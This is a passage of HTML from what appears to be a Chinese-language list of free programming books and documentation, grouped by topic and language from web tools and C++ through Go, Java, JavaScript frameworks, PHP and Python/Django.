href="https://www.codecademy.com/?locale_code=zh">Codecademy</a></li><li><a href="https://www.codeschool.com/">CodeSchool</a></li><li><a href="https://www.coursera.org/courses?orderby=upcoming&lngs=zh">Coursera</a></li><li><a href="https://learnxinyminutes.com/">Learn X in Y minutes</a></li><li><a href="https://www.shiyanlou.com/">shiyanlou</a></li><li><a href="https://teamtreehouse.com/">TeamTreeHouse</a></li><li><a href="https://www.udacity.com/">Udacity</a></li><li><a href="https://www.xuetangx.com/">xuetangX</a></li></ul><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><ul><li><a href="http://www.runoob.com/regexp/regexp-tutorial.html">正则表达式-菜鸟教程</a></li><li><a href="https://web.archive.org/web/20161119141236/http://deerchao.net:80/tutorials/regex/regex.htm">正则表达式30分钟入门教程</a></li></ul><h3 id="智能系统"><a href="#智能系统" class="headerlink" title="智能系统"></a>智能系统</h3><ul><li><a href="https://github.com/phodal/designiot">一步步搭建物联网系统</a></li></ul><h3 id="IDE-and-editors"><a href="#IDE-and-editors" class="headerlink" title="IDE and editors"></a>IDE and editors</h3><ul><li><a href="http://www.study-area.org/tips/vim/index.html">大家來學 VIM</a> - Edward Lee</li><li><a href="https://github.com/yangyangwithgnu/use_vim_as_ide">所需即所获：像 IDE 一样使用 vim</a> - yangyangwithgnu</li><li><a href="http://exvim.github.io/docs-zh/intro/">exvim–vim 改良成IDE项目</a></li><li><a href="https://github.com/judasn/IntelliJ-IDEA-Tutorial">IntelliJ IDEA 简体中文专题教程</a> - Judas.n</li><li><a href="https://github.com/vimcn/vimcdoc">Vim中文文档</a> - Vim 中文计划, Yian Willis</li></ul><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul><li><a href="http://jinlong.github.io/2013/08/29/devtoolsecrets/">浏览器开发工具的秘密</a></li><li><a href="http://coderlmn.github.io/code-standards/">前端代码规范 及 最佳实践</a></li><li><a href="https://github.com/fouber/blog/issues/2">前端开发体系建设日记</a></li><li><a href="https://github.com/hacke2/hacke2.github.io/issues/3">前端资源分享（二）</a></li><li><a href="https://github.com/hacke2/hacke2.github.io/issues/1">前端资源分享（一）</a></li><li><a href="https://github.com/hoosin/mobile-web-favorites">移动前端开发收藏夹</a></li><li><a href="https://github.com/AlloyTeam/Mars">移动Web前端知识库</a></li><li><a href="http://deerchao.net/tutorials/regex/regex.htm">正则表达式30分钟入门教程</a></li><li><a href="https://github.com/CN-Chrome-DevTools/CN-Chrome-DevTools">Chrome 开发者工具中文手册</a></li><li><a href="http://www.ituring.com.cn/minibook/950">Chrome扩展及应用开发</a></li><li><a href="http://open.chrome.360.cn/extension_dev/overview.html">Chrome扩展开发文档</a></li><li><a href="https://github.com/phodal/growth-ebook">Growth: 全栈增长工程师指南</a></li><li><a href="http://www.gruntjs.net/">Grunt中文文档</a></li><li><a href="https://github.com/nimojs/gulp-book">Gulp 入门指南</a></li><li><a href="http://www.gulpjs.com.cn/docs/">gulp中文文档</a></li><li><a href="https://github.com/bolasblack/http-api-guide">HTTP 接口设计指北</a></li><li><a href="https://github.com/darcyliu/google-styleguide/blob/master/JSONStyleGuide.md">JSON风格指南</a></li><li><a href="https://web.archive.org/web/20200415002730/http://man.lupaworld.com/content/network/wireshark/index.html">Wireshark用户手册</a></li></ul><h3 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h3><ul><li><a href="http://works.jinbuguo.com/apache/menu22/index.html">Apache 中文手册</a></li><li><a href="http://www.ttlsa.com/nginx/nginx-stu-pdf/">Nginx教程从入门到精通</a> - 运维生存时间 (PDF)</li><li><a href="http://tengine.taobao.org/book/index.html">Nginx开发从入门到精通</a> - 淘宝团队</li></ul><h2 id="语言相关"><a href="#语言相关" class="headerlink" title="语言相关"></a>语言相关</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul><li><a href="https://github.com/CharonChui/AndroidNote">Android Note(开发过程中积累的知识点)</a></li><li><a href="https://github.com/bboyfeiyu/android-tech-frontier">Android开发技术前线(android-tech-frontier)</a></li><li><a href="https://wcc723.gitbooks.io/google_design_translate/content/style-icons.html">Google Material Design 正體中文版</a> - Tillonter, 陳世能, Sean Chen, et al.</li><li><a href="https://github.com/1sters/material_design_zh">Google Material Design 中文协同翻译</a> - 1sters 极客实验室, 四勾 4J, IceskYsl, et al.</li><li><a href="https://github.com/FX-Max/Point-of-Android">Point-of-Android</a></li></ul><h3 id="Assembly"><a href="#Assembly" class="headerlink" title="Assembly"></a>Assembly</h3><ul><li>逆向工程权威指南 《Reverse Engineering for Beginners》 - Dennis Yurichev, Antiy Labs, Archer<ul><li><a href="https://beginners.re/RE4B-CN-vol1.pdf">逆向工程权威指南 《Reverse Engineering for Beginners》 Vol.1</a> - Dennis Yurichev, Antiy Labs, Archer (PDF)</li><li><a href="https://beginners.re/RE4B-CN-vol2.pdf">逆向工程权威指南 《Reverse Engineering for Beginners》 Vol.2</a> - Dennis Yurichev, Antiy Labs, Archer (PDF)</li></ul></li><li><a href="https://github.com/3dgen/cppwasm-book/tree/master/zh">C&#x2F;C++面向WebAssembly编程</a> - Ending, Chai Shushan (HTML, <a href="https://github.com/3dgen/cppwasm-book/tree/master/examples">:package: examples</a>)</li></ul><h3 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h3><ul><li><a href="https://github.com/wuzhouhui/awk">awk程序设计语言</a></li><li><a href="http://awk.readthedocs.org/en/latest/index.html">awk中文指南</a></li></ul><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><ul><li><a href="https://github.com/limingth/NCCL">新概念 C 语言教程</a></li><li><a href="https://beej-zhtw-gitbook.netdpi.net/">Beej’s Guide to Network Programming 簡體中文版</a> - Brian “Beej Jorgensen” Hall, 廖亚伦译</li><li><a href="http://c-faq-chn.sourceforge.net/ccfaq/ccfaq.html">C 语言常见问题集</a></li><li><a href="https://web.archive.org/web/20210514225440/http://docs.linuxtone.org/ebooks/C&CPP/c/">Linux C 编程一站式学习</a> <em>(:card_file_box: archived)</em></li></ul><h3 id="C-1"><a href="#C-1" class="headerlink" title="C#"></a><a id="csharp"></a>C#</h3><ul><li><a href="http://book.douban.com/subject/24827879/">精通C#(第6版)</a></li></ul><h3 id="C-2"><a href="#C-2" class="headerlink" title="C++"></a><a id="cpp"></a>C++</h3><ul><li><a href="https://github.com/hellogcc/100-gcc-tips/blob/master/src/index.md">100个gcc小技巧</a></li><li><a href="https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md">100个gdb小技巧</a></li><li><a href="https://web.archive.org/web/20210413213859/http://www.nowamagic.net/librarys/books/contents/c">简单易懂的C魔法</a> <em>(:card_file_box: archived)</em></li><li><a href="https://hackmd.io/@Luminous-Coder/CppTutorial-zh-tw">現代 C++ 101</a> - Luminous-Coder (:construction: <em>in process</em>)</li><li><a href="http://www.ituring.com.cn/book/1203">像计算机科学家一样思考（C++版)</a> (《How To Think Like a Computer Scientist: C++ Version》中文版)</li><li><a href="https://tinylab.gitbooks.io/cbook/content/">C 语言编程透视</a></li><li><a href="https://github.com/andycai/cprimer">C&#x2F;C++ Primer</a> - andycai</li><li><a href="https://github.com/forhappy/Cplusplus-Concurrency-In-Practice">C++ 并发编程指南</a></li><li><a href="http://www.sunistudio.com/cppfaq/">C++ FAQ LITE(中文版)</a></li><li><a href="https://github.com/Mooophy/Cpp-Primer">C++ Primer 5th Answers</a></li><li><a href="https://github.com/wuye9036/CppTemplateTutorial">C++ Template 进阶指南</a></li><li><a href="https://github.com/leeyiw/cgdb-manual-in-chinese">CGDB中文手册</a></li><li><a href="https://web.archive.org/web/20170615174144/http://sewm.pku.edu.cn/src/paradise/reference/CMake%20Practice.pdf">Cmake 实践</a> (PDF)</li><li><a href="http://docs.huihoo.com/gnu/linux/gmake.html">GNU make 指南</a></li><li><a href="http://zh-google-styleguide.readthedocs.org/en/latest/google-cpp-styleguide/contents/">Google C++ 风格指南</a></li><li><a href="https://github.com/anjuke/zguide-cn">ZMQ 指南</a></li></ul><h3 id="CoffeeScript"><a href="#CoffeeScript" class="headerlink" title="CoffeeScript"></a>CoffeeScript</h3><ul><li><a href="https://github.com/elrrrrrrr/coffeescript-style-guide/blob/master/README-ZH.md">CoffeeScript 编程风格指南</a></li><li><a href="https://github.com/geekplux/coffeescript-style-guide">CoffeeScript 编码风格指南</a></li><li><a href="http://coffee-script.org/">CoffeeScript 中文</a></li></ul><h3 id="Dart"><a href="#Dart" class="headerlink" title="Dart"></a>Dart</h3><ul><li><a href="https://web.archive.org/web/20200415002731/dart.lidian.info/wiki/Language_Tour">Dart 语言导览</a> <em>(:card_file_box: archived)</em></li></ul><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><ul><li><a href="https://github.com/looly/elasticsearch-definitive-guide-cn">Elasticsearch 权威指南</a> （《Elasticsearch the definitive guide》中文版）</li><li><a href="http://udn.yyuap.com/doc/mastering-elasticsearch/">Mastering Elasticsearch(中文版)</a></li></ul><h3 id="Elixir"><a href="#Elixir" class="headerlink" title="Elixir"></a>Elixir</h3><ul><li><a href="https://elixirschool.com/zh-hans">Elixir 编程语言教程</a> (Elixir School)</li><li><a href="https://github.com/Ljzn/ElixrGettingStartedChinese">Elixir Getting Started 中文翻译</a></li><li><a href="https://github.com/Ljzn/MetaProgrammingInElixirChinese">Elixir元编程与DSL 中文翻译</a></li><li><a href="https://mydearxym.gitbooks.io/phoenix-doc-in-chinese/content/">Phoenix 框架中文文档</a></li></ul><h3 id="Erlang"><a href="#Erlang" class="headerlink" title="Erlang"></a>Erlang</h3><ul><li><a href="https://github.com/liancheng/cpie-cn">Erlang 并发编程</a> (《Concurrent Programming in Erlang (Part I)》中文版)</li></ul><h3 id="Fortran"><a href="#Fortran" class="headerlink" title="Fortran"></a>Fortran</h3><ul><li><a href="http://micro.ustc.edu.cn/Fortran/ZJDing/">Fortran77和90&#x2F;95编程入门</a></li></ul><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><ul><li><a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh">深入解析 Go</a> - tiancaiamao</li><li><a href="http://mikespook.com/learning-go/">学习Go语言</a></li><li><a href="https://github.com/Unknwon/go-fundamental-programming">Go 编程基础</a></li><li><a href="https://github.com/golang-china/golangdoc.translations">Go 官方文档翻译</a></li><li><a href="https://github.com/songleo/the-little-go-book_ZH_CN">Go 简易教程</a> - Karl Seguin, <code>trl.:</code> Song Song Li (《<a href="https://github.com/karlseguin/the-little-go-book">The Little Go Book</a> - Karl Seguin》中文版)</li><li><a href="https://github.com/hyper-carrot/go_command_tutorial">Go 命令教程</a></li><li><a href="https://github.com/Unknwon/the-way-to-go_ZH_CN">Go 入门指南</a> (《The Way to Go》中文版)</li><li><a href="https://github.com/chai2010/go-ast-book">Go 语法树入门</a></li><li><a href="https://github.com/polaris1119/The-Golang-Standard-Library-by-Example">Go 语言标准库</a></li><li><a href="https://github.com/chai2010/advanced-go-programming-book">Go 语言高级编程（Advanced Go Programming）</a></li><li><a href="https://draveness.me/golang">Go 语言设计与实现</a> - draveness</li><li><a href="https://github.com/rujews/go-in-action-notes">Go 语言实战笔记</a></li><li><a href="https://tour.go-zh.org/list">Go 指南</a> (《A Tour of Go》中文版)</li><li><a href="https://github.com/astaxie/build-web-application-with-golang">Go Web 编程</a></li><li><a href="https://github.com/astaxie/go-best-practice">Go实战开发</a></li><li><a href="https://github.com/achun/Go-Blog-In-Action">Go语言博客实践</a></li><li><a href="http://blog.csdn.net/dc_726/article/details/46565241">Java程序员的Golang入门指南</a></li><li><a href="https://github.com/astaxie/NPWG_zh">Network programming with Go 中文翻译版本</a></li><li><a href="https://web.archive.org/web/20190610030938/https://gorevel.cn/docs/manual/index.html">Revel 框架手册</a> <em>(:card_file_box: archived)</em></li><li><a href="https://github.com/kevingo/the-little-go-book">The Little Go Book 繁體中文翻譯版</a> - Karl Seguin, <code>trl.:</code> KevinGo, Jie Peng (<a href="https://kevingo.gitbooks.io/the-little-go-book/">HTML</a>)</li></ul><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><ul><li><a href="https://www.w3cschool.cn/groovy">Groovy 教程</a> - W3Cschool</li></ul><h3 id="Haskell"><a href="#Haskell" class="headerlink" title="Haskell"></a>Haskell</h3><ul><li><a href="https://learnyouahaskell.mno2.org/">Haskell 趣学指南</a></li><li><a href="http://cnhaskell.com/">Real World Haskell 中文版</a></li></ul><h3 id="HTML-and-CSS"><a href="#HTML-and-CSS" class="headerlink" title="HTML and CSS"></a>HTML and CSS</h3><ul><li><a href="http://alloyteam.github.io/CodeGuide/">前端代码规范</a> - 腾讯AlloyTeam团队</li><li><a href="https://github.com/chadluo/CSS-Guidelines/blob/master/README.md">通用 CSS 笔记、建议与指导</a></li><li><a href="http://zh.learnlayout.com/">学习CSS布局</a></li><li><a href="https://bootstrap.hexschool.com/">Bootstrap 4 繁體中文手冊</a> - 六角學院</li><li><a href="https://bootstrap5.hexschool.com/">Bootstrap 5 繁體中文手冊</a> - 六角學院</li><li><a href="https://github.com/waylau/css3-tutorial">CSS3 Tutorial 《CSS3 教程》</a></li><li><a href="http://css.doyoe.com/">CSS参考手册</a></li><li><a href="http://yanxyz.github.io/emmet-docs/">Emmet 文档</a></li><li><a href="http://www.w3school.com.cn/html5/index.asp">HTML5 教程</a></li><li><a href="http://codeguide.bootcss.com/">HTML和CSS编码规范</a></li><li><a href="http://sass-guidelin.es/zh/">Sass Guidelines 中文</a></li></ul><h3 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h3><ul><li><a href="https://github.com/jkyin/Subtitle">网易斯坦福大学公开课：iOS 7应用开发字幕文件</a></li><li><a href="http://nilsun.github.io/apple-watch/">Apple Watch开发初探</a></li><li><a href="http://zh-google-styleguide.readthedocs.org/en/latest/google-objc-styleguide/">Google Objective-C Style Guide 中文版</a></li><li><a href="https://github.com/qinjx/30min_guides/blob/master/ios.md">iOS开发60分钟入门</a></li><li><a href="http://wileam.com/iphone-6-screen-cn/">iPhone 6 屏幕揭秘</a></li></ul><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><ul><li><a href="https://raw.githubusercontent.com/alibaba/p3c/HEAD/Java%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C(%E9%BB%84%E5%B1%B1%E7%89%88).pdf">阿里巴巴 Java 开发手册</a> (PDF)</li><li><a href="https://github.com/waylau/RestDemo">用jersey构建REST服务</a></li><li><a href="https://github.com/waylau/activiti-5.x-user-guide">Activiti 5.x 用户指南</a></li><li><a href="https://github.com/waylau/apache-mina-2.x-user-guide">Apache MINA 2 用户指南</a></li><li><a href="https://github.com/waylau/apache-shiro-1.2.x-reference">Apache Shiro 用户指南</a></li><li><a href="http://hawstein.com/2014/01/20/google-java-style/">Google Java编程风格指南</a></li><li><a href="https://github.com/waylau/h2-database-doc">H2 Database 教程</a></li><li><a href="https://java.quanke.name/">Java 编程思想</a> - quanke</li><li><a href="https://github.com/waylau/java-code-conventions">Java 编码规范</a></li><li><a href="https://github.com/waylau/servlet-3.1-specification">Java Servlet 3.1 规范</a></li><li><a href="https://github.com/waylau/Jersey-2.x-User-Guide">Jersey 2.x 用户指南</a></li><li><a href="https://github.com/waylau/jsse-reference-guide">JSSE 参考指南</a></li><li><a href="http://mybatis.github.io/mybatis-3/zh/index.html">MyBatis中文文档</a></li><li><a href="https://github.com/waylau/netty-4-user-guide">Netty 4.x 用户指南</a></li><li><a href="https://github.com/waylau/essential-netty-in-action">Netty 实战(精髓)</a></li><li><a href="http://nutzbook.wendal.net/">Nutz-book Nutz烹调向导</a></li><li><a href="https://nutzam.com/core/nutz_preface.html">Nutz文档</a></li><li><a href="https://github.com/waylau/rest-in-action">REST 实战</a></li><li><a href="https://github.com/qibaoguang/Spring-Boot-Reference-Guide">Spring Boot参考指南</a> (:construction: <em>翻译中</em>)</li><li><a href="https://github.com/waylau/spring-framework-4-reference">Spring Framework 4.x参考文档</a></li></ul><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><ul><li><a href="http://justjavac.com/named-function-expressions-demystified.html">命名函数表达式探秘</a> - kangax、为之漫笔(翻译) (原始地址无法打开，所以此处地址为justjavac博客上的备份)</li><li><a href="https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN">你不知道的JavaScript</a></li><li><a href="http://www.cnblogs.com/TomXu/archive/2011/12/15/2288411.html">深入理解JavaScript系列</a></li><li><a href="https://zh.javascript.info/">现代 JavaScript 教程</a> - Ilya Kantor</li><li><a href="http://www.oschina.net/translate/learning-javascript-design-patterns">学用 JavaScript 设计模式</a> - 开源中国</li><li><a href="https://github.com/adamlu/javascript-style-guide">Airbnb JavaScript 规范</a></li><li><a href="http://es6.ruanyifeng.com/">ECMAScript 6 入门</a> - 阮一峰</li><li><a href="https://web.archive.org/web/20200415002735/bq69.com/blog/articles/script/868/google-javascript-style-guide.html">Google JavaScript 代码风格指南</a> <em>(:card_file_box: archived)</em></li><li><a href="http://javascript.ruanyifeng.com/">JavaScript 标准参考教程（alpha）</a></li><li><a href="https://github.com/justjavac/12-javascript-quirks">javascript 的 12 个怪癖</a></li><li><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/">JavaScript 秘密花园</a></li><li><a href="https://github.com/jayli/javascript-patterns">《JavaScript 模式》</a> (《JavaScript patterns》译本)</li><li><a href="https://web.archive.org/web/20170112164945/http://typeof.net/s/jsmech/">JavaScript 原理</a></li><li><a href="http://liubin.github.io/promises-book/">JavaScript Promise迷你书</a></li><li><a href="http://pij.robinqu.me/">JavaScript编程指南</a> (<a href="https://github.com/RobinQu/Programing-In-Javascript">源码</a>)</li></ul><h4 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h4><blockquote><p>:information_source: See also &amp;#8230; <a href="#angular">Angular</a></p></blockquote><ul><li><a href="https://github.com/xufei/Make-Your-Own-AngularJS/blob/master/01.md">构建自己的AngularJS</a> - Xu Fei (HTML)</li><li><a href="http://www.waylau.com/build-angularjs-app-with-yeoman-in-windows/">在Windows环境下用Yeoman构建AngularJS项目</a> - Way Lau (HTML)</li><li><a href="https://github.com/zensh/AngularjsTutorial_cn">AngularJS入门教程</a> - Yan Qing, Hou Zhenyu, 速冻沙漠 (HTML) (:card_file_box: <em>archived</em>)</li><li><a href="https://github.com/mgechev/angularjs-style-guide/blob/master/README-zh-cn.md">AngularJS最佳实践和风格指南</a> - Minko Gechev, Xuefeng Zhu, Shintaro Kaneko, et al. (HTML)</li></ul><h4 id="Backbone-js"><a href="#Backbone-js" class="headerlink" title="Backbone.js"></a>Backbone.js</h4><ul><li><a href="http://www.the5fire.com/backbone-js-tutorials-pdf-download.html">Backbone.js入门教程</a> (PDF)</li><li><a href="https://github.com/the5fire/backbonejs-learning-note">Backbone.js入门教程第二版</a></li><li><a href="https://web.archive.org/web/20200916085144/https://www.html.cn/doc/backbone/">Backbone.js中文文档</a> <em>(:card_file_box: archived)</em></li></ul><h4 id="D3-js"><a href="#D3-js" class="headerlink" title="D3.js"></a>D3.js</h4><ul><li><a href="http://www.cnblogs.com/winleisure/tag/D3.js/">楚狂人的D3教程</a></li><li><a href="https://github.com/mbostock/d3/wiki/API--%E4%B8%AD%E6%96%87%E6%89%8B%E5%86%8C">官方API文档</a></li><li><a href="http://blog.csdn.net/zhang__tianxu/article/category/1623437">张天旭的D3教程</a></li><li><a href="http://d3.decembercafe.org/">Learning D3.JS</a> - 十二月咖啡馆</li></ul><h4 id="Electron-js"><a href="#Electron-js" class="headerlink" title="Electron.js"></a>Electron.js</h4><ul><li><a href="https://wizardforcel.gitbooks.io/electron-doc/content">Electron 中文文档</a> - WizardForcel</li><li><a href="https://www.w3cschool.cn/electronmanual">Electron 中文文档</a> - W3Cschool</li></ul><h4 id="ExtJS"><a href="#ExtJS" class="headerlink" title="ExtJS"></a>ExtJS</h4><ul><li><a href="http://extjs-doc-cn.github.io/ext4api/">Ext4.1.0 中文文档</a></li></ul><h4 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h4><ul><li><a href="https://web.archive.org/web/20201127045453/http://www.nowamagic.net/librarys/books/contents/jquery">简单易懂的JQuery魔法</a> <em>(:card_file_box: archived)</em></li><li><a href="http://i5ting.github.io/How-to-write-jQuery-plugin/build/jquery.plugin.html">How to write jQuery plugin</a></li></ul><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><ul><li><a href="http://nqdeng.github.io/7-days-nodejs/">七天学会NodeJS</a> - 阿里团队</li><li><a href="https://github.com/nswbmw/N-blog">使用 Express + MongoDB 搭建多人博客</a></li><li><a href="http://expressjs.jser.us/">express.js 中文文档</a></li><li><a href="http://javascript.ruanyifeng.com/nodejs/express.html">Express框架</a></li><li><a href="https://github.com/guo-yu/koa-guide">koa 中文文档</a></li><li><a href="https://www.npmjs.com/package/learnyounode-zh-cn">Learn You The Node.js For Much Win! (中文版)</a></li><li><a href="http://i5ting.github.io/node-debug-tutorial/">Node debug 三法三例</a></li><li><a href="https://github.com/alsotang/node-lessons">Node.js 包教不包会</a></li><li><a href="https://github.com/jollen/nodejs-fullstack-lessons">Node.js Fullstack《從零到一的進撃》</a></li><li><a href="http://www.nodebeginner.org/index-zh-cn.html">Node入门</a></li><li><a href="https://github.com/nodejs-tw/nodejs-wiki-book">Nodejs Wiki Book</a> (繁体中文)</li><li><a href="https://www.gitbook.com/book/0532/nodejs/details">nodejs中文文档</a></li><li><a href="https://www.gitbook.com/book/0532/nodejs/details">The NodeJS 中文文档</a> - 社区翻译</li></ul><h4 id="React-js"><a href="#React-js" class="headerlink" title="React.js"></a>React.js</h4><ul><li><a href="https://github.com/theJian/build-a-hn-front-page">Learn React &amp; Webpack by building the Hacker News front page</a></li><li><a href="https://github.com/hateonion/react-bits-CN">React-Bits 中文文档</a></li><li><a href="https://github.com/fakefish/react-webpack-cookbook">React webpack-cookbook</a></li><li><a href="http://fraserxu.me/intro-to-react/">React.js 入门教程</a></li><li><a href="https://discountry.github.io/react/">React.js 中文文档</a></li></ul><h4 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h4><ul><li><a href="https://vue3.chengpeiquan.com/">Vue3.0学习教程与实战案例</a> - chengpeiquan</li></ul><h4 id="Zepto-js"><a href="#Zepto-js" class="headerlink" title="Zepto.js"></a>Zepto.js</h4><ul><li><a href="https://web.archive.org/web/20210303025214/https://www.css88.com/doc/zeptojs_api/">Zepto.js 中文文档</a> <em>(:card_file_box: archived)</em></li></ul><h3 id="LaTeX"><a href="#LaTeX" class="headerlink" title="LaTeX"></a>LaTeX</h3><ul><li><a href="https://github.com/49951331/graduate-project-102pj/blob/master/docs/latex123.pdf">大家來學 LaTeX</a> (PDF)</li><li><a href="http://ctan.org/pkg/lshort-zh-cn">一份不太简短的 LaTeX2ε 介绍</a></li></ul><h3 id="Lisp"><a href="#Lisp" class="headerlink" title="Lisp"></a>Lisp</h3><ul><li><a href="http://acl.readthedocs.org/en/latest/">ANSI Common Lisp 中文翻译版</a></li><li><a href="http://www.ituring.com.cn/minibook/862">Common Lisp 高级编程技术</a> (《On Lisp》中文版)</li></ul><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><ul><li><a href="https://www.runoob.com/manual/lua53doc/">Lua 5.3 参考手册</a></li></ul><h3 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h3><ul><li><a href="http://www.jianshu.com/p/q81RER">献给写作者的 Markdown 新手指南</a></li><li><a href="https://markdown.tw/">Markdown 語法說明</a></li></ul><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ul><li><a href="http://www.cnblogs.com/mr-wid/archive/2013/05/09/3068229.html">21分钟MySQL入门教程</a></li><li><a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html">MySQL索引背后的数据结构及算法原理</a></li></ul><h3 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h3><ul><li><a href="https://github.com/huangz1990/annotated_redis_source">带有详细注释的 Redis 2.6 代码</a></li><li><a href="https://github.com/huangz1990/redis-3.0-annotated">带有详细注释的 Redis 3.0 代码</a></li><li><a href="http://disque.huangz.me/">Disque 使用教程</a></li><li><a href="http://redisdoc.com/">Redis 命令参考</a></li><li><a href="http://redisbook.com/">Redis 设计与实现</a></li><li><a href="https://github.com/justinyhuang/the-little-mongodb-book-cn/blob/master/mongodb.md">The Little MongoDB Book</a></li><li><a href="https://github.com/JasonLai256/the-little-redis-book/blob/master/cn/redis.md">The Little Redis Book</a></li></ul><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><ul><li><a href="https://github.com/fayland/chinese-perl-book">Master Perl Today</a></li><li><a href="https://web.archive.org/web/20150326073235/http://net.pku.edu.cn/~yhf/tutorial/perl/perl.html">Perl 5 教程</a></li><li><a href="http://www.yiibai.com/perl">Perl 教程</a></li></ul><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ul><li><a href="https://web.archive.org/web/20210624143822/https://codeigniter.org.tw/userguide3/">CodeIgniter 使用手冊</a> <em>(:card_file_box: archived)</em></li><li><a href="http://docs.phpcomposer.com/">Composer中文文档</a></li><li><a href="https://web.archive.org/web/20220330065727/myleftstudio.com/">Phalcon7中文文档</a> <em>(:card_file_box: archived)</em></li><li><a href="http://wulijun.github.io/php-the-right-way/">PHP 之道</a></li><li><a href="https://psr.phphub.org/">PHP标准规范中文版</a></li><li><a href="http://php.net/manual/zh/">PHP中文手册</a></li><li><a href="http://www.yiichina.com/doc/guide/2.0">Yii2中文文档</a></li></ul><h4 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h4><ul><li><a href="http://d.laravel-china.org/docs/5.4">Laravel 5.4 中文文档</a></li><li><a href="https://learnku.com/docs/laravel/6.x">Laravel 6 中文文档</a></li><li><a href="https://learnku.com/docs/laravel/7.x">Laravel 7 中文文档</a></li><li><a href="https://learnku.com/docs/laravel/8.x">Laravel 8 中文文档</a></li><li><a href="https://learnku.com/docs/laravel/9.x">Laravel 9 中文文档</a></li><li><a href="https://laravelacademy.org/books/laravel-tutorial">Laravel 入门到精通教程</a></li></ul><h4 id="Symfony"><a href="#Symfony" class="headerlink" title="Symfony"></a>Symfony</h4><ul><li><a href="https://wusuopu.gitbooks.io/symfony2_tutorial/content">Symfony 2 实例教程</a></li><li><a href="https://web.archive.org/web/20210812222957/symfony.com/doc/current/the-fast-track/zh_CN/index.html">Symfony 5 快速开发</a> <em>(:card_file_box: archived)</em></li></ul><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><ul><li><a href="http://works.jinbuguo.com/postgresql/menu823/index.html">PostgreSQL 8.2.3 中文文档</a></li><li><a href="http://www.postgres.cn/docs/9.3/index.html">PostgreSQL 9.3.1 中文文档</a></li><li><a href="http://www.postgres.cn/docs/9.4/index.html">PostgreSQL 9.4.4 中文文档</a></li><li><a href="http://www.postgres.cn/docs/9.5/index.html">PostgreSQL 9.5.3 中文文档</a></li><li><a href="http://www.postgres.cn/docs/9.6/index.html">PostgreSQL 9.6.0 中文文档</a></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><ul><li><a href="https://web.archive.org/web/20200822010330/https://bop.mol.uno/">简明 Python 教程</a> - Swaroop C H、沈洁元(翻译)、漠伦(翻译) <em>(:card_file_box: archived)</em></li><li><a href="https://www.cnblogs.com/derek1184405959/p/8579428.html">人生苦短，我用python</a> - zhang_derek <em>(内含丰富的笔记以及各类教程)</em></li><li><a href="https://github.com/jiechic/diveintopython3">深入 Python 3</a></li><li><a href="http://www.osgeo.cn/matplotlib/">Matplotlib 3.0.3 中文文档</a> (Online)</li><li><a href="http://www.osgeo.cn/numpy/">Numpy 1.16 中文文档</a> (Online)</li><li><a href="http://docspy3zh.readthedocs.org/en/latest/">Python 3 文档(简体中文) 3.2.2 documentation</a></li><li><a href="http://www.osgeo.cn/cpython/">Python 3.8.0a3中文文档</a> (Online) <em>(目前在线最全的中文文档了)</em></li><li><a href="http://www.pythondoc.com/">Python 中文学习大本营</a></li><li><a href="https://pythonguidecn.readthedocs.io/zh/latest/">Python 最佳实践指南</a></li><li><a href="http://python3-cookbook.readthedocs.io/zh_CN/latest/">Python Cookbook第三版</a> - David Beazley、Brian K.Jones、熊能(翻译)</li><li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000">Python教程 - 廖雪峰的官方网站</a></li><li><a href="https://interpy.eastlakeside.com/">Python进阶</a> - eastlakeside</li><li><a href="https://web.archive.org/web/20191217091745/http://funhacks.net/explore-python/">Python之旅</a> - Ethan <em>(:card_file_box: archived)</em></li><li><a href="http://www.osgeo.cn/tornado/">Tornado 6.1 中文文档</a> (Online) <em>(网络上其他的都是较旧版本的)</em></li></ul><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><ul><li><a href="https://www.yiyibooks.cn/xx/Django_1.11.6/index.html">Django 1.11.6 中文文档</a></li><li><a href="http://www.osgeo.cn/django/">Django 2.2.1 中文文档</a> (Online) <em>(这个很新，也很全)</em></li><li><a href="https://www.dusaiphoto.com/article/detail/2">Django 搭建个人博客教程 (2.1)</a> - 杜赛 (HTML)</li><li><a href="http://djangobook.py3k.cn/2.0/">Django book 2.0</a></li><li><a 